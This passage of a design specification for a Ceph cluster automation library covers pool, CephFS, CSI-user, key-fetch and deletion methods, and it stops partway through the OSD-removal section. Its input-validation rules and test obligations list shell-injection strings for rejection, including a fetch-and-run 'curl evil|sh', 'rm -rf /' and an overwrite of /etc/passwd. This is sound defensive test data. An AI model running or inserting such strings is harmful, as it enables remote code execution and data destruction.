# 04: Data plane

Methods specified here: `cephCreatePool`, `cephCreateFs`, `cephCreateCsiUser`,
`cephGetConnBundle`, `cephFetchCsiKey`, `cephDeleteFs`, `cephRemoveOsds`.

`cephCapacityReport` is specified in **05-verify**, not here.

The words MUST, MUST NOT, SHOULD and MAY are used as in RFC 2119. Where this
file and a decision in 00-overview §6 disagree, the decision wins.

## 1. Cross-cutting rules for this group

### 1.1 Target arguments

- Every method takes `host` plus the shared SSH argument family defined in
  00-overview §3 (`sshUser`, `port`, `keyPath`, `privateKey`,
  `strictHostKeyChecking`). The grammars are in 01-transport.
- The family MUST be declared once and shared by every method, never
  redeclared per method.
- Reminder for safety: `strictHostKeyChecking` accepts exactly `yes` or `no`
  (absent or null means `yes`). Other OpenSSH modes such as `accept-new` MUST
  be refused. `port` accepts 1–65535; 0 and 70000 MUST be refused.
- **Test:** a sweep over every method in this group checks that `port` and
  `strictHostKeyChecking` are present, nullish, and enforce those ranges.

### 1.2 Command execution

- Every Ceph command runs on the admin host over SSH, inside `cephadm shell`
  under sudo, using the cephadm-shell execution rules in 01-transport (script
  file in a fresh 0700 `mktemp -d` directory, D7; best-effort cleanup that
  never hides the command's own result).
- Commands MUST NOT be nested inside an inline quoted `bash -c "..."` on the
  SSH command line.
  - **Why:** caps strings contain spaces and single quotes, and must reach
    Ceph byte for byte.
- `rbd` commands run the same way as `ceph` commands (inside `cephadm shell`).

### 1.3 Time budgets (D37)

- Every cephadm-shell call MUST get at least a 5-minute budget.
  - **Why:** each call starts a container, and a short budget kills a command
    part-way and reports a partly applied change as a transport error.
- Pool creation and CephFS creation commands use a 10-minute default budget
  (named per method below).
- A caller-supplied budget below 5 minutes MUST be raised to 5 minutes, with a
  `warn` log.

### 1.4 Reading JSON

- Reads add `-f json` and parse the result.
- Accepted shapes:
  - Bare array: `osd pool ls`, `osd pool ls detail`, `osd crush rule ls`,
    `osd erasure-code-profile ls`, `fs ls`.
  - Object with an `auth_dump` array: `auth ls`.
  - `auth get <entity>`: a bare array (Squid 19.2.x), **and** the `auth_dump`
    wrapped form MUST also be accepted.
    - **Why:** assuming only one shape crashed against a live cluster.
  - A human "No <things> reported" line (for example from `orch ls` when
    nothing matches) means an empty list.
- Any other non-JSON output MUST be a hard error. The error SHOULD include a
  short excerpt of stdout and stderr, **except** for commands whose output can
  carry key material (§1.7), where only stderr may be quoted.

### 1.5 Errors and exits

- A non-zero exit is an error naming the host, the exit code and the output
  (subject to §1.7), unless the method explicitly tolerates it.
- An SSH exit of 255, a connection failure or a timeout is a typed transport
  error, even on a tolerated call (D8). See 01-transport for the taxonomy.
- Every thrown error starts with `cephadm[<phase>]:`, where the phase is the
  method name, followed by non-secret `key=value` pairs. Example:
  `cephadm[cephCreatePool]: size is required scheme=replicated name=rbd`.
- Mode and conditional-requirement rules MUST be re-checked when the method
  runs, not only by the schema (D20).

### 1.6 Input grammars (checked by the schema before any SSH call)

**Create-direction identifier** (pool name, fs name, client entity name,
application, failure domain, user name):

- 1–128 characters from letters, digits, `.`, `_`, `-`.
- The first character MUST be a letter or digit, so a leading dot is refused.
  - **Why:** a caller must not be able to create a name that looks like a
    Ceph-reserved one.
- Accept: `rbd`, `cephfs.cephfs.data`, `csi-rbd-node`, `host`.
- Reject: `.mgr`, `rbd_vm; curl evil|sh`, `rbd $(id)`, ``host`whoami` ``,
  `cephfs; rm -rf /`, `csi-rbd-node > /etc/passwd`, the empty string.

**Caps expression:**

- 1–512 characters from letters, digits, space, single quote, double quote,
  `=`, `*`, `/`, `,`, `.`, `_`, `-`.
- Refused: backtick, `$`, `;`, `&`, `|`, newline, `<`, `>`, parentheses,
  backslash, and anything else not listed.
- MUST accept: `profile rbd`, `allow r`, `allow rw`,
  `allow rw tag cephfs metadata=*`, `allow rw tag cephfs *=*`,
  `allow rw tag cephfs metadata=* pool='foo bar'`.
- MUST reject: ``csi-rbd-provisioner`id` ``, `profile rbd; rm -rf /`.

Values that pass a grammar are still quoted when placed in a script.

### 1.7 Secret discipline

- Only `cephFetchCsiKey` may read key material into a record, and only into
  its sensitive field.
- Other methods receive output that contains keys (`auth get-or-create`,
  `auth get`, `auth ls`). They MUST parse it, keep only entity names and caps,
  and discard the key at once.
- Key material MUST NOT appear in any record, returned data handle, log line
  or error message. Error excerpts for the four commands above (and for
  `auth get-key`) MUST NOT include stdout.

### 1.8 Records

- Keys follow 00-overview §4: `<method>-<host>` or
  `<method>-<host>-<subject>`, stable and never timestamped.
  - **Why:** different kinds of result can share a subject name (a pool and a
    filesystem both called `cephfs`). The method name in the key stops one
    silently overwriting the other.
- Every resource is `lifetime: infinite` and keeps 10 versions, except
  `csiKey`, which keeps 2 (D33).
- Every resource schema is strict and declares every field written (D41, D49).
- Results carry `capturedAt`, an ISO-8601 time from the injectable clock.
  Sleeps between polls use the injectable sleep, so tests never wait.

### 1.9 Poll loops

- Poll loops sleep `pollIntervalMs` between polls and never after the last
  poll.
- Only transport errors are retried inside a poll loop. Any other failure
  stops the loop at once (D47).
- An exhausted budget MUST fail. It never passes silently.
- A method that has defaulted poll arguments MUST apply the defaults itself as
  well as in the schema, because it can be called without schema defaulting.

### 1.10 Description leads

`cephGetConnBundle` starts with `READ-ONLY.`; `cephDeleteFs` and
`cephRemoveOsds` start with `DESTRUCTIVE.`; `cephFetchCsiKey` starts with
`SENSITIVE.` (00-overview §4).

---

## 2. cephCreatePool

- **Safety class:** M (mutating, idempotent converge).
- **Purpose:** ensure a replicated or erasure-coded pool exists with the
  requested redundancy, failure domain and application. An existing pool that
  matches is left in place, with only its size and application converged.

### Inputs

| name | type | required | default | constraints | meaning |
|---|---|---|---|---|---|
| `host` + SSH family | see §1.1 | yes | | | admin host |
| `name` | string | yes | | identifier | pool name |
| `scheme` | `replicated` \| `erasure` | yes | | | redundancy scheme |
| `size` | integer ≥ 1, nullish | when replicated | | null accepted by schema | replica count |
| `erasureProfile` | `{k: int ≥ 1, m: int ≥ 1}`, nullish | when erasure | | null accepted by schema | EC data and coding chunks |
| `application` | string | yes | | identifier | application tag (`rbd`, `cephfs`, `rgw`, …) |
| `failureDomain` | string | yes | | identifier | CRUSH failure domain, e.g. `host` |

### Preconditions

A reachable admin host with cephadm and passwordless sudo.

### Behaviour

Derived names:
- replicated CRUSH rule: `<failureDomain>_rule`;
- EC profile: `ec_k<k>_m<m>_<failureDomain>`.

The CRUSH root is always `default`, the root Ceph creates at bootstrap.
Non-default roots and device classes are out of scope (D36).

1. Read `ceph osd pool ls detail` and find the entry whose `pool_name` equals
   `name`.
2. Re-check the conditional requirement (D20): replicated with `size` absent
   or null MUST be refused ("size is required"); erasure with `erasureProfile`
   absent or null MUST be refused ("erasureProfile is required"). Null means
   missing. No default is ever substituted.
3. **Existing pool: match check (D31).** Before any change, compare the pool
   with the request and refuse with `expected=` / `actual=` on any mismatch:
   - **Scheme:** the pool's `type` (1 = replicated, 3 = erasure) MUST equal
     the requested scheme.
   - **Replicated rule:** read `ceph osd crush rule dump <failureDomain>_rule`.
     If the rule does not exist, or its `rule_id` differs from the pool's
     `crush_rule`, refuse. The rule MUST NOT be created on this path.
   - **EC profile:** the pool's `erasure_code_profile` MUST equal the derived
     profile name.
   - The method MUST NOT converge only the application on a mismatched pool.
4. **New replicated pool:**
   - Read `ceph osd crush rule ls`. If the derived rule is missing, run
     `ceph osd crush rule create-replicated <rule> default <failureDomain>`
     and record the change `crushRule:<rule>`.
   - If the rule already exists, read `ceph osd crush rule dump <rule>` and
     refuse unless its steps take item `default` and choose leaves of type
     `failureDomain`.
   - Run `ceph osd pool create <name> replicated <rule>` (10-minute budget,
     D37). Record `created`.
5. **New EC pool:**
   - Read `ceph osd erasure-code-profile ls`. If the derived profile is
     missing, run
     `ceph osd erasure-code-profile set <profile> k=<k> m=<m> crush-failure-domain=<failureDomain>`
     and record `erasureCodeProfile:<profile>`.
   - If the profile already exists, read
     `ceph osd erasure-code-profile get <profile>` and refuse unless `k`, `m`
     and `crush-failure-domain` match the request and `crush-root` (if
     present) is `default`.
   - Run `ceph osd pool create <name> erasure <profile>` (10-minute budget,
     D37). Record `created`.
6. **Size (replicated only):** if the pool is new or its `size` differs, run
   `ceph osd pool set <name> size <size>` and record `size:<n>`. Size MUST
   NOT be set on an EC pool, even when a value is present.
7. **Application:** if the pool's `application_metadata` does not already
   have `application` as a key, run
   `ceph osd pool application enable <name> <application>` and record
   `application:<application>`.
8. **RBD init:** when `application` is `rbd`, always run
   `rbd pool init <name>` (10-minute budget), new pool or not. It is safe to
   repeat and is not recorded as a change.
9. Write the record.

### Idempotency

A second run against a matching pool issues only the initial read (plus the
D31 rule read for replicated pools, plus `rbd pool init` for rbd pools) and
reports `changed: []`. The CRUSH rule and EC profile are created once and
reused by later pools.

### Output / record

Spec `poolResult`, key `cephCreatePool-<host>-<name>`.

| field | meaning |
|---|---|
| `name`, `scheme`, `application`, `failureDomain` | as requested |
| `size` | replicated only; absent for erasure |
| `crushRule` | replicated only: the derived rule name |
| `erasureCodeProfile` | erasure only: the derived profile name |
| `existed` | whether the pool was already present |
| `changed` | ordered list of change tokens (`created`, `crushRule:<r>`, `erasureCodeProfile:<p>`, `size:<n>`, `application:<a>`) |
| `capturedAt` | ISO-8601 |

No secrets.

### Post-verification

None beyond the D31 match check. The cluster state is not re-read after
changes; `cephVerifyPool` (05-verify) is the read-back proof.

### Failure modes

- Missing or null `size` (replicated) → throw "size is required", after the
  initial read and before any change.
- Missing or null `erasureProfile` (erasure) → throw "erasureProfile is
  required", before any change.
- Existing pool with a different scheme, rule or profile → throw with
  expected/actual, before any change (D31).
- Pre-existing rule or profile whose content does not match its derived name
  → throw with expected/actual, before the pool is created.
- Any Ceph command exits non-zero, or a read is not JSON → throw.

### Security

`name`, `application`, `failureDomain` and `host` reach command lines and MUST
pass their grammars.

### Why

- A workflow looping over a mixed list of pool specs sends both `size` and
  `erasureProfile` on every row, filling the absent one with an explicit null.
  Both MUST accept null, or the first row of the other scheme fails before any
  Ceph command runs.
- Null still means missing, so a replicated pool with a null size is refused
  rather than given a default.
- The failure domain becomes an explicit CRUSH rule so the argument really
  takes effect, instead of falling back to the built-in replicated rule.
- Silently "converging" an existing pool of the wrong scheme or rule reports
  success for a durability layout nobody asked for (D31).
- An RBD pool with the application enabled but no `rbd pool init` breaks RBD
  and CSI clients in ways that are hard to debug.

### Test obligations

- [ ] New replicated pool (size 3, rbd, host) → commands in order: pool ls
      detail, crush rule ls, `crush rule create-replicated host_rule default host`,
      `pool create <name> replicated host_rule`, `set size 3`,
      `application enable rbd`, `rbd pool init`. Result `existed=false`,
      `crushRule=host_rule`, `changed` contains `created`. Key
      `cephCreatePool-<host>-<name>`.
- [ ] New EC pool (k=4, m=2, host, rgw) → profile `ec_k4_m2_host` set with
      `k=4 m=2 crush-failure-domain=host`, erasure pool created, application
      enabled, no `rbd pool init`, no size set. `size` absent, `changed`
      contains `erasureCodeProfile:ec_k4_m2_host`.
- [ ] Existing matching cephfs pool → no changes, `existed=true`,
      `changed=[]`.
- [ ] Existing rbd pool with size 2, size 3 requested → `changed=["size:3"]`,
      `rbd pool init` issued.
- [ ] Replicated, `size` omitted → "size is required"; no mutating command.
- [ ] Replicated, `size: null` → passes schema, then refused "size is
      required" at run time (D20).
- [ ] Erasure, `erasureProfile` omitted → refused with an "erasureProfile"
      message.
- [ ] Replicated with `erasureProfile: null` on a matching pool → passes
      validation, `changed=[]`, no erasure-code-profile command.
- [ ] Erasure with `size: null`, k=3, m=2 → passes schema, creates
      `ec_k3_m2_host`, `size` absent, no size set.
- [ ] D31: replicated request for an existing EC pool → refused with
      expected/actual; no mutating command issued.
- [ ] D31: existing replicated pool on a different `crush_rule` id than
      `host_rule` → refused; no rule created, no application enabled.
- [ ] D31: EC request for an existing pool with profile `ec_k3_m2_host` when
      k=4, m=2 is requested → refused.
- [ ] Pre-existing profile `ec_k4_m2_host` whose `k` is 3 → refused before
      pool create.
- [ ] D37: `osd pool create` gets a budget of at least 10 minutes; every call
      gets at least 5.
- [ ] Schema rejects the injection examples of §1.6 in `name`,
      `application`, `failureDomain` and `host`; accepts
      `cephfs.cephfs.data`.

---

## 3. cephCreateFs

- **Safety class:** M (mutating, idempotent converge).
- **Purpose:** ensure a CephFS volume exists and its MDS daemons are placed on
  an explicit host list. It either creates the volume from scratch or adopts
  pre-created metadata and data pools; adoption is the only way to get an
  erasure-coded data pool.

### Inputs

| name | type | required | default | constraints | meaning |
|---|---|---|---|---|---|
| `host` + SSH family | see §1.1 | yes | | | admin host |
| `name` | string | yes | | identifier | CephFS volume name |
| `mdsHosts` | string[] | yes | | ≥ 1 entry; each a hostname per 01-transport; no duplicates | hosts to run MDS daemons on (D32) |
| `timeoutMs` | positive integer, nullish | no | 600000 (10 min) | raised to 300000 if lower (D37) | budget for `fs volume create`, `fs new` and `orch apply mds` only; not an overall deadline |

### Preconditions

- Reachable admin host with cephadm and passwordless sudo.
- Every `mdsHosts` entry is enrolled in the orchestrator (the placement rules
  are those of `cephApplyMds`, 03-lifecycle).
- For an EC data pool: the pool has `allow_ec_overwrites` set (D32).

### Behaviour

1. Read `ceph fs ls`. If an entry's `name` equals `name`, the creation path is
   `already existed`; go to step 3.
2. Read `ceph osd pool ls` and look for `cephfs.<name>.meta` and
   `cephfs.<name>.data`:
   - **Both exist (adopt):** read `ceph osd pool ls detail` and find the data
     pool.
     - If its `erasure_code_profile` is non-empty, the pool is EC. Its
       `flags_names` MUST contain `ec_overwrites`; otherwise refuse with an
       actionable message naming the fix,
       `ceph osd pool set cephfs.<name>.data allow_ec_overwrites true` (D32).
       Then run
       `ceph fs new <name> cephfs.<name>.meta cephfs.<name>.data --force`.
     - Otherwise run the same command **without** `--force`.
     - Creation path `fs new (adopted pools)`.
   - **Exactly one exists:** refuse before any change. The operator must
     create both pools or neither.
   - **Neither exists:** run `ceph fs volume create <name>`. Creation path
     `fs volume create`.
3. Always apply MDS placement for the volume to exactly `mdsHosts`, using the
   same placement behaviour as `cephApplyMds` (03-lifecycle), e.g.
   `ceph orch apply mds <name> --placement="<h1> <h2>"`. This runs on the
   already-existed path too; the apply is declarative and safe to repeat.
4. Write the record.

### Idempotency

On an existing volume only the MDS placement is re-applied. The pools of an
existing volume are never checked or changed. A re-run after a partial
failure (both pools created, no filesystem) takes the adopt path.

### Output / record

Spec `fsResult`, key `cephCreateFs-<host>-<name>`.

| field | meaning |
|---|---|
| `name` | volume name |
| `mdsHosts` | the placement applied, sorted |
| `creationPath` | `already existed`, `fs new (adopted pools)` or `fs volume create` (declared in the schema, D32) |
| `existed` | whether the volume was already present |
| `capturedAt` | ISO-8601 |

### Post-verification

None. The method does not wait for MDS daemons. `cephVerifyPool` with its MDS
option (05-verify) is the read-back proof.

### Failure modes

- Exactly one backing pool exists → throw, no change.
- EC data pool without `ec_overwrites` → throw with the fix, no change (D32).
- `mdsHosts` empty, duplicated or invalid → refused by schema and again at
  run time (D20).
- A command exits non-zero → throw.
- A transport timeout during `fs volume create` can leave both pools and no
  filesystem; the error is a typed transport error (D8) and a re-run adopts.

### Security

`name` and every `mdsHosts` entry pass their grammars. Schema rejects
`cephfs; rm -rf /`.

### Why

- `fs volume create` fails with EINVAL when `cephfs.<name>.meta` and
  `cephfs.<name>.data` already exist, so existing pools must be adopted with
  `fs new`.
- `fs new` refuses an EC default data pool without `--force`. With
  `allow_ec_overwrites` set this is the approved pattern, and without it CephFS
  cannot write to the pool, so EC-ness and the flag are read before choosing.
  Replicated adoption must not pass `--force`.
- An explicit host list keeps MDS placement deterministic and consistent with
  `cephApplyMds`; a count lets the orchestrator pick hosts the caller did not
  intend.
- A short budget once killed `fs volume create` part-way and reported a partly
  applied change as a transport error, hence the long default.

### Test obligations

- [ ] Fresh cluster, no pools → `fs ls`, `osd pool ls`, `fs volume create`,
      `orch apply mds` with the two given hosts. `existed=false`,
      `creationPath="fs volume create"`, key `cephCreateFs-<host>-<name>`.
- [ ] Volume already exists → only `fs ls` and `orch apply mds`.
      `existed=true`, `creationPath="already existed"`.
- [ ] Both pools exist, data pool `erasure_code_profile` empty →
      `fs new <name> <meta> <data>` without `--force`; no `fs volume create`.
- [ ] D32: both pools exist, EC data pool, `flags_names` contains
      `ec_overwrites` → `fs new` ends with `--force`.
- [ ] D32: EC data pool without `ec_overwrites` → refused; message names
      `allow_ec_overwrites`; no `fs new`, no `orch apply`.
- [ ] Only one of the two pools exists → throw before any mutating command.
- [ ] D32: schema declares `creationPath`; the record validates strictly.
- [ ] A pool and a filesystem both named `X` write to different keys.
- [ ] D37: `timeoutMs: 60000` is raised to 300000 with a warning; default is
      600000.
- [ ] Schema rejects injection in `name`, `mdsHosts` and `host`.

---

## 4. cephCreateCsiUser

- **Safety class:** M (mutating, idempotent converge). Key material passes
  through the output of the commands and MUST be discarded (§1.7).
- **Purpose:** create a Ceph client entity, or set an existing one's caps to
  exactly the request. Returns the name and the caps in force, as read back
  from the cluster. Never returns a key.

### Inputs

| name | type | required | default | constraints | meaning |
|---|---|---|---|---|---|
| `host` + SSH family | see §1.1 | yes | | | admin host |
| `name` | string | yes | | identifier; given without the `client.` prefix | entity name |
| `caps.mon` | string | yes | | caps grammar | mon caps |
| `caps.mgr` | string | yes | | caps grammar | mgr caps |
| `caps.osd` | string | yes | | caps grammar | osd caps |
| `caps.mds` | string, nullish | no | | caps grammar | mds caps; omitted from commands when absent |

The method adds `client.` itself and does not strip one the caller supplies,
so `client.x` targets `client.client.x`.

### Preconditions

Reachable admin host with cephadm and passwordless sudo.

### Behaviour

1. Build the caps arguments as subsystem/value pairs in the order mon, mgr,
   osd, then mds if given. Each value is single-quoted for the shell, with any
   embedded single quote escaped so the value arrives as one argument.
2. Run `ceph auth get-or-create client.<name> <caps...>`. Its output contains
   the key and MUST NOT be parsed, stored or logged.
3. Always run `ceph auth caps client.<name> <caps...>` with the same caps.
   This makes the requested caps authoritative.
4. Read `ceph auth get client.<name>`, accepting both shapes (§1.4). Find the
   entry whose `entity` is `client.<name>`, keep only its `caps` map, and
   discard the key.
5. Write the record.

### Idempotency

Every run issues all three commands. Setting identical caps changes nothing.
Caps changed by hand are put back to the requested set on the next run.

### Output / record

Spec `csiUserResult`, key `cephCreateCsiUser-<host>-<name>`. Fields: `name`,
`caps` (the map read back; an empty map if none), `capturedAt`. No key
material and no key field name.

### Post-verification

The caps are re-read with `auth get` and stored as the cluster reports them,
not as requested.

### Failure modes

- `auth get` has no entry for `client.<name>` → throw.
- A command exits non-zero → throw, with stderr only (§1.7).

### Security

`name` passes the identifier grammar; caps pass the caps grammar and are then
single-quoted. Nothing is ever placed inside a nested inline `bash -c`.

### Why

- When the entity exists, `ceph auth get-or-create` silently ignores the caps
  passed to it and just returns the existing key, so convergence needs an
  unconditional `ceph auth caps`.
- Recording caps as read back, not as requested, makes the record evidence of
  cluster state.

### Test obligations

- [ ] Bare-array `auth get` → record data is exactly
      `{name, caps:{mon,mgr,osd}, capturedAt}`; the serialised record and
      returned handles do not contain the fake key, which appeared in both the
      get-or-create and `auth get` output. Both get-or-create and `auth caps`
      were issued. Key `cephCreateCsiUser-<host>-<name>`.
- [ ] Caps `allow rw tag cephfs metadata=* pool='foo bar'` for osd, with a
      wrapped `auth_dump` response → no SSH argument contains `bash -c "`;
      running the generated `auth caps` script through a real bash with
      `ceph` replaced by an argument printer yields the exact caps value as a
      single argument; the stored osd caps equal the input.
- [ ] `caps.mds` given → `mds 'allow rw'` appears in the `auth caps` script;
      `caps.mds: null` → no mds pair.
- [ ] `auth get` returns no matching entity → throw.
- [ ] A non-JSON `auth get` output containing the fake key → the error
      message does not contain the key.
- [ ] Schema rejects injection in `name` and in each caps field, and accepts
      every caps string listed in §1.6.

---

## 5. cephGetConnBundle

- **Safety class:** RO (read-only). Description starts `READ-ONLY.`
- **Purpose:** produce the non-secret facts a client (CSI driver, CephFS
  mount) needs alongside separately delivered keys: fsid, mon v2 endpoints,
  pool names, CephFS names and client entity names.

### Inputs

`host` and the SSH family only.

### Preconditions

Reachable admin host with cephadm and passwordless sudo.

### Behaviour

1. Read `ceph mon dump`. Take `fsid`. For each mon in order, take every
   `public_addrs.addrvec` entry whose `type` is `v2` and keep its `addr`. v1
   entries are dropped.
2. Read `ceph osd pool ls` (a bare list of names).
3. Read `ceph fs ls` and keep each entry's `name`.
4. Read `ceph auth ls`. From `auth_dump`, keep entity names that start with
   `client.`, drop `client.admin` and every `client.bootstrap-*`, and strip
   the `client.` prefix. Non-client entities (`mgr.*`, `osd.*`, …) are
   dropped. Keys are discarded as soon as the output is parsed.
5. Write the record.

### Idempotency

No cluster changes. A re-run writes a newer version under the same key.

### Output / record

Spec `connBundleResult`, key `cephGetConnBundle-<host>`, where `host` is the
argument exactly as given (hostname or IPv4). Fields: `fsid`, `monEndpoints`
(v2 `ip:port` strings), `pools`, `filesystems`, `csiUserNames`, `capturedAt`.
No key material.

### Post-verification

Not applicable (read-only).

### Failure modes

A read exits non-zero or returns non-JSON → throw (stderr only for
`auth ls`, §1.7).

### Security

`host` is validated. `strictHostKeyChecking` is applied to every SSH call the
method makes (script write, execute, cleanup).

### Why

- The key must be buildable from what a reader already has. Deriving it from
  the fsid, one of the facts the bundle exists to provide, forced readers to
  chain lookups, and downstream workflows ended up hand-typing fsid and mon
  addresses, which go stale unnoticed.
- The key is stable (no timestamp) so "latest" lookups resolve to the newest
  write; different admin hosts get different keys.
- A reader using any other key gets a failed lookup, not an empty bundle.

### Test obligations

- [ ] Two mons, one with v2 and v1 addresses, one with only v2 →
      `monEndpoints` lists just the two v2 addresses, in order.
- [ ] `pools` and `filesystems` pass through unchanged.
- [ ] `auth ls` with `client.admin`, `client.bootstrap-osd`, two
      `client.csi-*` and one `mgr.*` entity → `csiUserNames` is exactly the
      two csi names without the prefix.
- [ ] The serialised record and handles contain no key string.
- [ ] Key equals `cephGetConnBundle-<host>` built from the host alone,
      including for `192.0.2.10`; same host gives the same key, different
      hosts different keys; the key never contains the fsid.
- [ ] `strictHostKeyChecking: "no"` → every SSH call carries
      `StrictHostKeyChecking=no`.

---

## 6. cephFetchCsiKey

- **Safety class:** S (sensitive read). Description starts `SENSITIVE.`
- **Purpose:** the only method that returns a client entity's secret key, in
  a resource field marked sensitive, which the platform stores in its vault.

### Inputs

| name | type | required | default | constraints | meaning |
|---|---|---|---|---|---|
| `host` + SSH family | see §1.1 | yes | | | admin host |
| `userName` | string | yes | | identifier; bare name without `client.` | entity name |

The method adds `client.` itself and does not strip one the caller supplies.
Names with a leading dot are refused by the grammar; CSI entities are always
created by the caller.

### Preconditions

Reachable admin host; the entity exists.

### Behaviour

1. Run `ceph auth get-key client.<userName>`.
2. Trim surrounding whitespace. The result MUST be a single non-empty line of
   base64 characters (letters, digits, `+`, `/`, `=`); otherwise throw
   without quoting the output.
3. Write the record.

### Idempotency

No cluster changes. Each run writes a new version; 2 versions are kept (D33).

### Output / record

Spec `csiKey`, key `cephFetchCsiKey-<host>-<userName>`. Fields: `userName`,
`key`. The schema marks `key` sensitive, so the stored record holds a vault
reference, never the plaintext. Returned data handles carry only the record
key and spec name, never the key value.

Consumers SHOULD resolve the reference only at the point of use and MUST NOT
copy the value into workflow data, logs or documents.

### Post-verification

Not applicable.

### Failure modes

- Entity missing or a non-zero exit → throw. Neither the error nor the log
  quotes stdout; the log line names the user only.
- Output that is empty or not a single base64 line → throw.

### Security

`userName` passes the identifier grammar.

### Why

- A method can hand a value back only through a written record, so the
  protection comes from the sensitive marking, not from skipping storage.
- Keeping 2 versions bounds the number of vaulted copies of a secret while
  still allowing one rollback (D33).
- Checking the output shape stops a warning line or other text being vaulted
  and handed to a client as a key.

### Test obligations

- [ ] The resources declaration includes `csiKey`, its `key` field is marked
      sensitive, and it keeps 2 versions (D33).
- [ ] Mocked stdout of key plus newline → written data is exactly
      `{userName, key}` with the key trimmed; record key
      `cephFetchCsiKey-<host>-<userName>`.
- [ ] Serialised returned handles do not contain the key.
- [ ] Non-zero exit with the key on stdout → error message and logs do not
      contain it.
- [ ] Schema rejects `csi-rbd-node > /etc/passwd`.
- [ ] The resources declaration includes every spec in this group:
      `poolResult`, `fsResult`, `csiUserResult`, `connBundleResult`, `csiKey`,
      `fsDeleteResult`, `osdRemoveResult`, each strict.

---

## 7. cephDeleteFs

- **Safety class:** D (destructive, irreversible); a no-op when the volume is
  absent. Description starts `DESTRUCTIVE.`
- **Purpose:** delete a CephFS volume and its backing pools
  (`fs volume rm` removes both), with a double confirmation, proven MDS
  removal, and an always-restored pool-delete gate.

### Inputs

| name | type | required | default | constraints | meaning |
|---|---|---|---|---|---|
| `host` + SSH family | see §1.1 | yes | | | admin host |
| `fsName` | string | yes | | identifier | volume to delete |
| `confirmFsName` | string | yes | | ≥ 1 char; must equal `fsName` exactly | the target named a second time |
| `maxPolls` | positive integer, nullish | no | 30 | | MDS-removal poll budget |
| `pollIntervalMs` | positive integer, nullish | no | 10000 | | time between polls |

### Preconditions

Reachable admin host. Clients should be unmounted; the method does not check.

### Behaviour

1. If `confirmFsName` is not exactly `fsName`, refuse before any SSH call.
2. Read `ceph fs ls`. If no entry has `name` equal to `fsName`, write a record
   with `deleted=false`, `alreadyAbsent=true`, `mdsServiceRemoved=false`,
   `poolsDeleted=[]`, `poolsRemaining=[]`, `gateRestored=true` (the gate was
   never touched) and return.
3. Record the backing pools from that entry: `metadata_pool` and every
   `data_pools` name. Record the "before" pool set from `ceph osd pool ls`.
4. Run `ceph orch rm mds.<fsName>`. A non-zero exit is tolerated (the service
   may already be gone); transport errors are not (D8).
5. Poll `ceph orch ls --service_name mds.<fsName>` until it is empty ("No
   services reported" counts as empty), up to `maxPolls` (§1.9). If the
   service is still listed, refuse ("still present") without touching the
   volume.
6. Run `ceph config set mon mon_allow_pool_delete true`, then
   `ceph fs volume rm <fsName> --yes-i-really-mean-it`.
7. Whatever happened in step 6 (success, failure or throw), run
   `ceph config set mon mon_allow_pool_delete false`. Record `gateRestored`
   as whether it exited 0. A restore failure never hides the step 6 error.
8. If step 6 failed: write the record (`deleted=false`, `gateRestored` as
   observed) and throw the step 6 error. If the gate was also not restored,
   the message MUST also say `gateRestored=false`.
9. Re-read `ceph fs ls`. If the volume is still listed, throw (accepted but
   no effect).
10. Re-read `ceph osd pool ls`. `poolsDeleted` is the sorted set of "before"
    pools now gone; `poolsRemaining` is the sorted set of backing pools still
    present.
11. Write the record with `deleted=true`, `alreadyAbsent=false`,
    `mdsServiceRemoved=true`.
12. Then, if `poolsRemaining` is non-empty, throw naming them (D34). Then, if
    `gateRestored` is false, throw `gateRestored=false` (D34). Both are
    reported in one message when both apply.

### Idempotency

A second run finds the volume absent and is a clean no-op.

### Output / record

Spec `fsDeleteResult`, key `cephDeleteFs-<host>-<fsName>`.

| field | meaning |
|---|---|
| `fsName` | target |
| `deleted` | whether the volume was removed by this run |
| `alreadyAbsent` | volume absent at the start |
| `mdsServiceRemoved` | MDS service proven gone |
| `poolsDeleted` | sorted pools gone after removal |
| `poolsRemaining` | sorted backing pools still present (D34) |
| `gateRestored` | whether the pool-delete gate was set back to false (D34) |
| `capturedAt` | ISO-8601 |

### Post-verification

The volume MUST be absent from `fs ls`, and every backing pool MUST be absent
from `osd pool ls` (D34).

### Failure modes

- Confirmation mismatch → throw, zero SSH calls.
- MDS service still listed after the budget → throw "still present"; no gate
  change, no volume removal.
- Volume removal fails (e.g. EINVAL, busy) → gate restored, record written,
  error propagates with Ceph's stderr.
- Gate restore fails → record has `gateRestored=false`, then throw (D34).
- Volume still listed after removal → throw.
- A backing pool still present → record written, then throw (D34).

### Security

`fsName` passes the identifier grammar. `confirmFsName` is only compared and
never placed in a command.

### Why

- Naming the target twice catches a copy-paste of the wrong name before
  deletion, not after.
- `orch rm` returns before the daemons stop. Deleting a volume under a running
  or re-spawning MDS leaves orphaned daemons and a stuck filesystem, so removal
  must be proved by polling.
- A cluster left with `mon_allow_pool_delete=true` lets any later mistake
  delete pools, so the gate is opened only for the removal, always closed
  again, and a failure to close it is never silent.
- An accepted command is not proof of effect, so both the volume and its pools
  are re-read.

### Test obligations

- [ ] Mismatched confirmation → rejects "confirmFsName does not match"; zero
      SSH calls.
- [ ] Volume absent (another fs listed) → `deleted=false`,
      `alreadyAbsent=true`; no `fs volume rm`, no gate change.
- [ ] Happy path (`orch ls` answers "No services reported"; before pools
      `.mgr`, `cephfs.<fs>.data`, `cephfs.<fs>.meta`; after `.mgr`) →
      `deleted=true`, `mdsServiceRemoved=true`,
      `poolsDeleted=["cephfs.<fs>.data","cephfs.<fs>.meta"]`,
      `poolsRemaining=[]`, `gateRestored=true`; gate set true before false;
      `fs volume rm <fs> --yes-i-really-mean-it` issued.
- [ ] Volume removal exits 25 with stderr "busy" → rejects with "busy"; the
      gate-false command was still issued.
- [ ] `orch ls` keeps listing the service with `maxPolls=3` → rejects "still
      present"; exactly 3 polls, 2 sleeps; no `fs volume rm`, no gate change.
- [ ] D34: data pool still present after removal → record has
      `poolsRemaining=["cephfs.<fs>.data"]`, then throws.
- [ ] D34: gate-false command exits non-zero → record has
      `gateRestored=false`, then throws with `gateRestored=false`.
- [ ] D34: removal fails and gate restore fails → error contains both the
      removal error and `gateRestored=false`.
- [ ] D47: a non-transport failure of the `orch ls` poll stops the loop at
      once.
- [ ] Defaults apply when called without schema defaulting (30 polls,
      10000 ms).

---

## 8. cephRemoveOsds

- **Safety class:** D (destructive); idempotent per id. Description starts
  `DESTRUCTIVE.`
- **Purpose:** remove OSDs through the orchestrator (cephadm drains them and,
  by default, zaps the disks for reuse). Removal is proven by OSD membership,
  not by the orchestrator accepting the request.

### Inputs

| name | type | required | default | constraints | meaning |
|---|---|---|---|---|---|
| `host` + SSH family | see §1.1 | yes | | | admin host |
